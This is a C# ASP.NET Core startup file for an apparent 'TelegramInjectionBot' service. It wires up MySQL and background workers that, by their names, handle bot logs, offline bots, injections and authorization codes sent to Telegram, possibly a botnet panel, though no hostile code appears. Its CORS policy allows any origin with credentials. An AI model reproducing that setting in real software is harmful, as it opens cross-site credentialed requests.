using Microsoft.EntityFrameworkCore;
using TelegramInjectionBot.Data;
using TelegramInjectionBot.Services;
using TelegramInjectionBot.Stores;
using TelegramInjectionBot.Workers;

var builder = WebApplication.CreateBuilder(args);

builder.Services.AddDbContext<EFContext>(option =>
{
    string connectionString;

    if (Environment.GetEnvironmentVariable("MYSQL_PORT") == null)
    {
        connectionString = builder.Configuration.GetConnectionString("MySQL");
    }
    else
    {
        var host = Environment.GetEnvironmentVariable("MYSQL_HOST");
        var database = Environment.GetEnvironmentVariable("MYSQL_DATABASE");
        var password = Environment.GetEnvironmentVariable("MYSQL_PASSWORD");
        var username = Environment.GetEnvironmentVariable("MYSQL_USER");
        connectionString = $"Server={host};Database={database};Uid={username};Pwd={password};";
    }

    option.UseMySql(connectionString, ServerVersion.Parse("8.0.24-mysql"));
});

builder.Services.AddSingleton<BotLogStore>();
builder.Services.AddSingleton<TelegramBotCustomClient>();
builder.Services.AddHostedService<InjectionToTelegramWorker>();
builder.Services.AddHostedService<CheckNewBotLogsWorker>();
builder.Services.AddHostedService<CheckOfflineBotsWorker>();
builder.Services.AddHostedService<HandleTelegramMessagesWorker>();
builder.Services.AddHostedService<SendUserAuthorizarionCodesToTelegramWorker>();
builder.Services.AddHostedService<SendNewMessagesWorker>();

builder.Services.AddControllers();

var app = builder.Build();

app.UseCors(x => x
    .AllowAnyMethod()
    .AllowAnyHeader()
    .SetIsOriginAllowed(origin => true)
    .AllowCredentials()
);

app.UseAuthorization();

app.MapControllers();

app.Run();